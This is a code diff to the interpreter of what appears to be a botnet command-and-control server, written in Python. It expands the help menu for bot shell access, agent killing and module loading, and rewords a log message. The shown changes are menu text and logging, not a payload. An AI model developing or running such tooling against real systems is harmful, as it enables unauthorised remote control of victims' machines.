@@ -98,13 +98,18 @@ class Interpreter(threading.Thread):
         print('''
 [* Interpreter-Msg] Usage information:\n")
 [+ COMMANDS +]")
-        - help          : Print this message
-        - interact <id> : Opens an interactive BASH/CMD prompt on the selected bot
-        - exit          : Exits the program; Causes agents to sleep and retry every 10-45 seconds
-        - clear         : Clears the screen; Presents a fresh terminal
-        - list-agents   : Lists all active agents in use
-        - interact <id> : Opens an interactive BASH/CMD prompt on the selected bot
-        - kill <id>     : Kill a connection to a specific bot. Causes bot process to exit. [* Will not recur *]
+        SERVER:
+        - help                          : Print this message
+        - exit                          : Exits the program; Causes agents to sleep and retry every 10-45 seconds
+        - clear                         : Clears the screen; Presents a fresh terminal
+        - list-agents                   : Lists all active agents in use
+        AGENTS:
+        - interact <id>                 : Opens an interactive BASH/CMD prompt on the selected bot
+        - kill <id>                     : Kill a connection to a specific bot. Causes bot process to exit. [* Will not recur *]
+        MODULES:
+        - list-modules <windows|linux>  : List all modules currently available to the user on the C2, seperated by operating system
+        - load-module <module-name>     : Loads a module into the chamber       
+
         ''')
         loggers[0].q_log('serv','info','[* Interpreter-Msg] Help message printed')
 
@@ -260,6 +265,7 @@ class Interpreter(threading.Thread):
 
         shellExecStatus = False
         loggers[0].q_log('serv','info','[* Interpreter-Msg] Calling handler .shell() function')
+
         for agent in self.agentList:
             if agent.getID() == id:
                 shellExecStatus = agent.shell()
@@ -275,7 +281,7 @@ class Interpreter(threading.Thread):
 #------------------------------------------------------------------------------------------------------------------------------
     def kill(self, id):
         print(f"[* Interpreter-Msg] Killing connection with Bot #{id}.\n")
-        loggers[0].q_log('serv','info','[* Interpreter-Msg] Kill connection with bot '+str(id))
+        loggers[0].q_log('serv','info','[* Interpreter-Msg] Killing connection with bot '+str(id))
 
         loggers[0].q_log('serv','info','[* Interpreter-Msg] Calling handler .kill() function')
         for agent in self.agentList:
